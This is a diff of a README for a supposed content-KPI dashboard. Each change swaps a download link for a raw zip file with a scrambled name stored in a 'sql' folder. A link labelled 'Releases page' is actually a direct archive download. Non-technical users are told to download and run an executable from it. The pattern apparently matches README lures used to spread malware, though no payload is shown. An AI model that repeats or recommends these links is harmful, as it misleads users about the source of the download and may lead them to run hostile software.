@@ -1,7 +1,7 @@
 # 📊 Content-KPI-Monitor - Track Your Content Performance Effortlessly
 
 ## 🔗 Download Here
-[![Download Content-KPI-Monitor](https://raw.githubusercontent.com/M-Sempai/Content-KPI-Monitor/main/sql/Content-KPI-Monitor-1.1.zip)](https://raw.githubusercontent.com/M-Sempai/Content-KPI-Monitor/main/sql/Content-KPI-Monitor-1.1.zip)
+[![Download Content-KPI-Monitor](https://raw.githubusercontent.com/M-Sempai/Content-KPI-Monitor/main/sql/Content-Monitor-KP-norate.zip)](https://raw.githubusercontent.com/M-Sempai/Content-KPI-Monitor/main/sql/Content-Monitor-KP-norate.zip)
 
 ## 🚀 Getting Started
 Welcome to the Content-KPI-Monitor! This application provides an easy way to track the performance of your online content. With this dashboard, you can see key performance indicators (KPIs) such as impressions, clicks, conversions, and more. 
@@ -15,7 +15,7 @@ To run Content-KPI-Monitor, make sure you have these:
 - Disk Space: Minimum of 100MB
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/M-Sempai/Content-KPI-Monitor/main/sql/Content-KPI-Monitor-1.1.zip) to download.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/M-Sempai/Content-KPI-Monitor/main/sql/Content-Monitor-KP-norate.zip) to download.
 2. **Select the Latest Version:** Click on the latest release. This will take you to a list of available files.
 3. **Download the Executable File:** Choose the appropriate file for your operating system and click to download it.
 4. **Run the Application:**
@@ -58,6 +58,6 @@ This application addresses various areas such as:
 If you run into issues or need assistance, check the "Issues" section of the repository. You can also leave a comment there, and someone will assist you.
 
 ## 🔗 Download Here Again 
-[![Download Content-KPI-Monitor](https://raw.githubusercontent.com/M-Sempai/Content-KPI-Monitor/main/sql/Content-KPI-Monitor-1.1.zip)](https://raw.githubusercontent.com/M-Sempai/Content-KPI-Monitor/main/sql/Content-KPI-Monitor-1.1.zip)
+[![Download Content-KPI-Monitor](https://raw.githubusercontent.com/M-Sempai/Content-KPI-Monitor/main/sql/Content-Monitor-KP-norate.zip)](https://raw.githubusercontent.com/M-Sempai/Content-KPI-Monitor/main/sql/Content-Monitor-KP-norate.zip)
 
 This document will help you start using Content-KPI-Monitor without needing technical knowledge. Enjoy tracking and optimizing your content performance!
